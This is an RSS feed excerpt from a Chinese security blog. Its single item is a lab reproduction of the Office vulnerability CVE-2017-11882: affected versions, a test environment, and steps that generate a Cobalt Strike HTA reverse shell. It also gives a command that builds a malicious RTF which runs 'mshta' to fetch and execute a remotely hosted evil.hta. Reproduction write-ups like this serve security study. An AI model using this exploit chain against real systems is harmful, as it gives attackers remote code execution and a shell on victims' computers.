<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>漏洞复现 on 倾旋的博客</title><link>https://payloads.online/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link><description>Recent content in 漏洞复现 on 倾旋的博客</description><generator>Hugo</generator><language>zh-cn</language><copyright>倾旋 All rights reserved</copyright><lastBuildDate>Tue, 21 Nov 2017 00:00:00 +0000</lastBuildDate><atom:link href="https://payloads.online/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.xml" rel="self" type="application/rss+xml"/><item><title>CVE-2017-11882漏洞复现</title><link>https://payloads.online/archivers/2017-11-21/1/</link><pubDate>Tue, 21 Nov 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2017-11-21/1/</guid><description>0x00 前言 参考backlion师傅的PDF，记录一下这个过程。
2017年11月14日，微软发布了11月份的安全补丁更新，其中比较引人关注的莫过于悄然修复了潜伏17年之久的Office远程代码执行漏洞（CVE-2017-11882）。该漏洞为Office内存破坏漏洞，影响目前流行的所有Office版本。攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。 由于漏洞影响面较广，漏洞披露后，金睛安全研究团队持续对漏洞相关攻击事件进行关注。11月19日，监控到了已有漏洞POC在网上流传，随即迅速对相关样本进行了分析。目前该样本全球仅微软杀毒可以检测。
漏洞影响版本： Office 365 Microsoft Office 2000 Microsoft Office 2003 Microsoft Office 2007 Service Pack 3 Microsoft Office 2010 Service Pack 2 Microsoft Office 2013 Service Pack 1 Microsoft Office 2016 0x01 环境清单 WindowsServer 2008 (192.168.3.114) Office 2007 MAC OSX(192.168.3.106) 0X02 复现过程 使用Cobalt Strike生成hta反弹shell 将生成的hta文档放入WebServer根目录：http://192.168.3.106/evil.hta
我(Cobalt Strike)本地监听了一个8081端口，用来接收客户端的Shell
生成一个rtf/doc文档 github上已有生成脚本
webdav_exec_CVE-2017-11882.py 地址： http://payloads.online/tools/cve-2017-11882/webdav_exec_CVE-2017-11882.py
生成rtf文档：
1 2 python webdav_exec_CVE-2017-11882.py -u http://192.168.3.106/evil.hta -e &amp;#34;mshta http://192.168.3.106/evil.hta&amp;#34; -o test.rtf !!! Completed !</description></item></channel></rss>